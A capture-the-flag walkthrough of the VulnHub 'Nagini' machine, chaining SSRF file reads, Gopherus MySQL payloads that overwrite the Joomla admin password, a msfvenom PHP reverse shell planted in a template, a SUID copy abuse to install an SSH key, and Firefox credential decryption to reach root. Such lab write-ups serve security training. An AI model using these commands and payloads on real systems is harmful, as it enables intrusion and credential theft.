# Walkthrough VULNHUB --> HARRY POTTER: NAGINI

First step is to scan our Netwok to find the machine IP, in my case the host has ip 192.168.1.174.

We use nmap to scan the target machine with the command:

```bash
nmap -sC -sV -p- 192.168.1.174
```

![Alt text](./HARRY_POTTER_NAGINI/img/nmap.PNG?raw=true "NMAP Results")

I navigate to the web page to see what it is and to check if we find any visible vulnerability on that page.

![Alt text](./HARRY_POTTER_NAGINI/img/web_page_port80.PNG?raw=true "Port 80")

We run a scan on the port 80 with gobuster to search for interesting things.

```bash
gobuster dir --url http://192.168.1.174 -x .php,.js,.txt,.html --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50
```

![Alt text](./HARRY_POTTER_NAGINI/img/gobuster.PNG?raw=true "GOBUSTER SCAN")

We start browsing the /note.txt and we find as follow:

```
Hello developers!!


I will be using our new HTTP3 Server at https://quic.nagini.hogwarts for further communications.
All developers are requested to visit the server regularly for checking latest announcements.


Regards,
site_amdin
```

**WE NEED HTTP3!!!!!**

We also need to add **quic.nagini.hogwarts** in our **/etc/hosts**.

After spending some time on internet trying to figure out how to use this http3, I found this guide to enable **curl** with http3 support.

[https://github.com/curl/curl/blob/master/docs/HTTP3.md](https://github.com/curl/curl/blob/master/docs/HTTP3.md)

**NOW I built a new curl with http3 support**

Using curl we do a GET request on https://quic.nagini.hogwarts:

```bash
./curl --http3 https://quic.nagini.hogwarts
```

![Alt text](./HARRY_POTTER_NAGINI/img/http3.PNG?raw=true "CURL HTTP3")

We retrieve 2 important informations:
1 /internalResourceFeTcher.php
2 .bak

Let's see what is /internalResourceFeTcher.php

![Alt text](./HARRY_POTTER_NAGINI/img/internalFetcher.PNG?raw=true "/internalResourceFeTcher.php")

Let's try to search for a and see the result.

![Alt text](./HARRY_POTTER_NAGINI/img/a.PNG?raw=true "/internalResourceFeTcher.php search")

Noted something?

The search append in the url **?url=a**, so let's try to see if there is any **SSRF** vulnerability using in the url **file:///etc/passwd**

```bash
curl http://192.168.1.174/internalResourceFeTcher.php?url=file:///etc/passwd
```

![Alt text](./HARRY_POTTER_NAGINI/img/passwd.PNG?raw=true "/etc/passwd")

As you might have noticed, in the webserver there is Joomla, so now let's see if we can access to Jumla configuration file.

```bash
curl http://192.168.1.174/internalResourceFeTcher.php?url=file:///var/www/html/joomla/configuration.php
```

![Alt text](./HARRY_POTTER_NAGINI/img/config.PNG?raw=true "/var/www/html/joomla/configuration.php")

Searching on Google "SSRF exploit mysql",
![Alt text](./HARRY_POTTER_NAGINI/img/google.PNG?raw=true "Google search")
I found my answers in [Gopherus](https://github.com/tarunkant/Gopherus)

First step with Gopherus is to create a payload that give us the table list so using the command **use joomla; show tables;**.
![Alt text](./HARRY_POTTER_NAGINI/img/showTables.PNG?raw=true "SHOW Tables payload")

Appending the payload to curl, does not work.

So, I try to add the payload on the url in the browser. It seems that doesn't work either.

**At the end I pasted the payload in the search and submitted by clicking on Fetch**

If you don't see anything refresh the page, it can take few refresh before something is displayed.

![Alt text](./HARRY_POTTER_NAGINI/img/1try.PNG?raw=true "List Tables")

As you can see we can display the tables and we can see that there is a joomla_users table, which we are going to see next by creating another payload with Gopherus as done previously.

The command we are going to run is:

```sql
USE joomla; SELECT * FROM joomla_users
```

We could list the users and find the user **site_admin** and it's password.
![Alt text](./HARRY_POTTER_NAGINI/img/joomla_users.PNG?raw=true "Joomla Users")

After trying a lot of MD5 decoder, I decided to create another payload to change the password using **password1234**, so it's hased is **bdc87b9c894da5168059e00ebffb9077**.

Our command will be then:

```sql
use joomla; update joomla_users set password = 'bdc87b9c894da5168059e00ebffb9077' where username='site_admin';select * from joomla_users;
```

![Alt text](./HARRY_POTTER_NAGINI/img/newP.PNG?raw=true "New Password")

We are now able to login in the Joomla's administration portal, by going to http://192.168.1.174/joomla/administrator

![Alt text](./HARRY_POTTER_NAGINI/img/joomlaAdminLogin.PNG?raw=true "Admin Login")

We can insert **super_admin**/**password1234** and we're in!

![Alt text](./HARRY_POTTER_NAGINI/img/adminPage.PNG?raw=true "Admin Page")

We can now modify a template adding a payload that we are going to generate with **msfvenom**

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f raw -o test.php
```

![Alt text](./HARRY_POTTER_NAGINI/img/msfVenom.PNG?raw=true "MSFVENOM")

Let's start **msfconsole** using **explit/multi/handler** and setting up the payload as **php/meterpreter/reverse_tcp**

![Alt text](./HARRY_POTTER_NAGINI/img/msf.PNG?raw=true "MSFCONSOLE")

Next step will be to copy the content of test.php into our joomla template, so let's see what is inside our payload:

```bash
cat test.php
```

![Alt text](./HARRY_POTTER_NAGINI/img/payload.PNG?raw=true "Payload")

Now we move into the Admin console and we navigate till the Template editor.

![Alt text](./HARRY_POTTER_NAGINI/img/editTemplate.PNG?raw=true "Edit Template")

We are going now to paste our payload in line 9 and we save.

![Alt text](./HARRY_POTTER_NAGINI/img/editedTemplate.PNG?raw=true "Edited Template")

Once saved, just go to [http://quic.nagini.hogwarts/joomla/infex.php](http://quic.nagini.hogwarts/joomla/infex.php) and **BOOOOOOOOOM**.... We got a reverse shell in our meterpreter.

![Alt text](./HARRY_POTTER_NAGINI/img/reverse.PNG?raw=true "REVERSE SHELL")

At this point we can open the shell and start exploring:

```bash
meterpreter > shell
Process 3482 created.
Channel 0 created.
export TERM=xterm
python3  -c "import pty;pty.spawn('/bin/bash')"

```

I always like to see how many users there are in the system, so I navigate in the home and noted 2 users, **snape** and **hermoine**.

I went first on the snape home directory and find the .creds.txt file which contains some base64 information so i decoded it and find something I'll try next as password. Let's see the steps:

```bash
www-data@Nagini:/home/snape$ cd /home
cd /home
www-data@Nagini:/home$ ls
ls
hermoine  snape
www-data@Nagini:/home$ cd sna
cd snape/
www-data@Nagini:/home/snape$ ls -l
ls -l
total 0
www-data@Nagini:/home/snape$ ls -la
ls -la
total 32
drwxr-xr-x 4 snape snape 4096 Apr  4 17:09 .
drwxr-xr-x 4 root  root  4096 Apr  4 00:22 ..
-rw-r--r-- 1 snape snape  220 Apr  3 23:57 .bash_logout
-rw-r--r-- 1 snape snape 3526 Apr  3 23:57 .bashrc
-rw-r--r-- 1 snape snape   17 Apr  4 10:35 .creds.txt
drwx------ 3 snape snape 4096 Apr  4 16:38 .gnupg
-rw-r--r-- 1 snape snape  807 Apr  3 23:57 .profile
drwx------ 2 snape snape 4096 Apr  4 10:42 .ssh
www-data@Nagini:/home/snape$ cat .cre
cat .creds.txt
TG92ZUBsaWxseQ==
www-data@Nagini:/home/snape$ cat .creds.txt |base64 -d
cat .creds.txt |base64 -d
Love@lilly
```

We can now try to login as snape via ssh:

```bash
ssh snape@quic.nagini.hogwarts
```

![Alt text](./HARRY_POTTER_NAGINI/img/snape.PNG?raw=true "SNAPE")

I tried to check if we have sudo permission, but no, then I checked the system permission to run some code and found something interesting.

In /home/hermoine/bin there is a su_cp.

```bash
snape@Nagini:~$ sudo -l
-bash: sudo: command not found
snape@Nagini:~$ find / -perm -u=s 2>/dev/null
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/home/hermoine/bin/su_cp

```

The **su_cp** command seems to copy a file from SOURCE to DEST.

Navigating in /home/hermoine, I noted that there is .ssh folder which is empty.

So i thought to upload a id_rsa using a webserver to snape home file and then using the su_cp to import it into /home/hermoine/.ssh/authorized_keys

Before doing it, I forgot to catch the 1st flag :D

```bash
snape@Nagini:~$ find / -name horcrux* 2>/dev/null
/var/www/html/horcrux1.txt
/home/hermoine/horcrux2.txt
snape@Nagini:~$ cat /var/www/html/horcrux1.txt
horcrux_{MzXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX9O}

```

**Let's move on....**

Let's open a new terminal in our Hacking machine and go to the .ssh folder

```bash
cd ~/.ssh
```

Start a web server

```bash
python3 -m http.server 80
```

![Alt text](./HARRY_POTTER_NAGINI/img/http.PNG?raw=true "LOCAL WEB SERVER")

On the hacked machine, using the snape user, we use wget to download the file id_rsa.pub

```bash
snape@Nagini:~$ wget http://192.168.1.200/id_rsa.pub
--2021-06-13 19:41:36--  http://192.168.1.200/id_rsa.pub
Connecting to 192.168.1.200:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 566 [application/vnd.exstream-package]
Saving to: ‘id_rsa.pub’

id_rsa.pub                                100%[=====================================================================================>]     566  --.-KB/s    in 0s

2021-06-13 19:41:36 (37.6 MB/s) - ‘id_rsa.pub’ saved [566/566]
```

Now we use the su_cp to copy the id_rsa.pub in /home/hermoine/.ssh/authorized_keys

```bash
snape@Nagini:~$ /home/hermoine/bin/su_cp id_rsa.pub /home/hermoine/.ssh/authorized_keys

```

At this stage, we can close our snape connection and connect with the user hermoine using our private key

```bash
┌──(animale㉿kali)-[~/.ssh]
└─$ ssh -i ~/.ssh/id_rsa hermoine@quic.nagini.hogwarts
Linux Nagini 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jun 13 19:46:14 2021 from 192.168.1.200
hermoine@Nagini:~$
```

**WE'RE IN!!!!!!!!!!!!**

We can now get the second flag

```bash
hermoine@Nagini:~$ cat horcrux2.txt
horcrux_{NXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXU=}
hermoine@Nagini:~$

```

Searching on the machine for a way to escalate the priviliges, I couldn't find anything.

The only valuable thing i found is in hermoine home, and it is the .mozilla folder

The latest versions of Firefox store passwords, encrypted, in a JSON text file, logins.json, in your Firefox profile folder at /home/'yourProfile'/.firefox/ or /home/'yourProfile'/.mozilla/firefox.

I found a [firefox decryptor](https://github.com/Unode/firefox_decrypt/blob/master/firefox_decrypt.py) and I'm going to use it to see if we get something useful.

Before to run it, we have to download the .mozilla from hrmoine home.

```bash
scp -r -i ~/.ssh/id_rsa hermoine@quic.nagini.hogwarts:/home/hermoine/.mozilla /tmp/nagini/.
```

We can now run the **firfox_decrypt.py**

```bash
┌──(animale㉿kali)-[~/Tools/firefox_decrypt]
└─$ python3 firefox_decrypt.py /tmp/nagini/.mozilla/firefox                                                                                                         1 ⨯

Website:   http://nagini.hogwarts
Username: 'root'
Password: '@Alohomora#123'
```

#### **BOOM BOOM!!!!!!! We got it!!!!**

Let's connect in ssh!

![Alt text](./HARRY_POTTER_NAGINI/img/rootSSH.PNG?raw=true "ROOT SSH")

Finally we are **root**... Let's take the last flag!!!!

![Alt text](./HARRY_POTTER_NAGINI/img/rootFlag.PNG?raw=true "ROOT Flag")
